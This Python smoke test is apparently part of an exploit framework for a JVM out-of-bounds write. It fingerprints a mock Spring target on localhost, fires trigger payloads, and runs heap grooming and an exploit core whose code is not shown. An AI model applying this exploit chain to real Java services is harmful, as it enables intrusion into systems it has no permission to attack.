#!/usr/bin/env python3
# Integration smoke test: mock VulnApp + OOB trigger detection.
# Validates that the new soft-signal detection catches "decode error" in response.

import os
import sys
import time
import threading
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from mock_vulnapp import start as start_mock

# ── 1. Start mock server ───────────────────────────────────────────────────────
PORT = 18080
srv = start_mock(PORT, daemon=True)
time.sleep(0.3)
print(f"[test] Mock VulnApp running on :{PORT}")

# ── 2. Build a minimal FingerprintResult ──────────────────────────────────────
from modules.fingerprint import fingerprint, FingerprintResult
from modules.targets import PROFILES

fp = FingerprintResult(target_url=f"http://127.0.0.1:{PORT}")
fp.reachable          = True
fp.jdk_major          = 25          # compact headers
fp.jdk_version        = "25.0.4"
fp.jdk_vendor         = "OpenJDK"
fp.gc_type            = "G1GC"
fp.avx512_host_present = False      # confirmed absent
fp.avx512_likely      = False       # scalar path
fp.obj_header_size    = 12
fp.oob_write_bytes    = 63
fp.region_size_bytes  = 1024 * 1024
fp.baseline_ms        = 10.0
fp.profile            = PROFILES["spring"]
fp.profile_key        = "spring"
fp.app_name           = "Mock VulnApp (Spring profile)"

print(f"[test] FP: JDK {fp.jdk_major}, gc={fp.gc_type}, avx512={fp.avx512_likely}, hdr={fp.obj_header_size}B")

# ── 3. Build trigger payloads (should use scalar path) ────────────────────────
from modules.exploit_core import build_trigger_payloads, _deliver_trigger, _build_scalar_payloads

payloads = build_trigger_payloads(fp)
print(f"[test] Scalar payloads generated: {len(payloads)}")
for p in payloads[:3]:
    print(f"  → {p[:60]}...")

# ── 4. Fire trigger and check detection ───────────────────────────────────────
endpoint = sorted(fp.profile.endpoints, key=lambda e: e["priority"])[0]
print(f"\n[test] Firing trigger on endpoint: {endpoint['path']}")

hit = False
for i, payload in enumerate(payloads):
    result = _deliver_trigger(
        fp.target_url, endpoint, payload, timeout=5.0,
        baseline_ms=fp.baseline_ms,
    )
    if result.oob_confirmed or result.type_confusion_likely:
        print(f"\n[test] ✅  OOB SIGNAL on payload #{i+1}!")
        print(f"  oob_confirmed        : {result.oob_confirmed}")
        print(f"  type_confusion_likely: {result.type_confusion_likely}")
        print(f"  status               : {result.status_code}")
        print(f"  response_time_ms     : {result.response_time_ms:.1f}ms")
        print(f"  snippet              : {result.response_snippet[:120]!r}")
        for note in result.notes:
            print(f"  → {note}")
        hit = True
        break
    else:
        print(f"  [payload #{i+1}] no signal — status={result.status_code} snippet={result.response_snippet[:60]!r}")

# ── 5. Warmup function test ───────────────────────────────────────────────────
print("\n[test] Warmup function test (n=20) ...")
from modules.exploit_core import warmup_target
ok = warmup_target(fp, n=20, threads=4, timeout=5.0, verbose=False)
print(f"  Warmup: {ok}/20 OK")

# ── 6. Full run_exploit_core test ─────────────────────────────────────────────
from modules.heap_oracle import HeapOracleResult, _derive_target_offset
from modules.grooming import GroomResult
from modules.exploit_core import run_exploit_core, print_exploit_core

oracle = HeapOracleResult()
oracle.target_offset, oracle.groom_spray_size = _derive_target_offset(fp)
oracle.spray_count = 50
oracle.confidence  = 0.65

groom = GroomResult(success=True)

print("\n[test] run_exploit_core (max_attempts=3) ...")
core = run_exploit_core(fp, oracle, groom, max_attempts=3, timeout=5.0, verbose=True)
print_exploit_core(core)

srv.shutdown()

if hit or core.oob_triggered:
    print("\n✅  SMOKE TEST PASSED — OOB detection working with scalar fallback + decode-error signal")
    sys.exit(0)
else:
    print("\n❌  SMOKE TEST FAILED — no OOB signal detected")
    sys.exit(1)
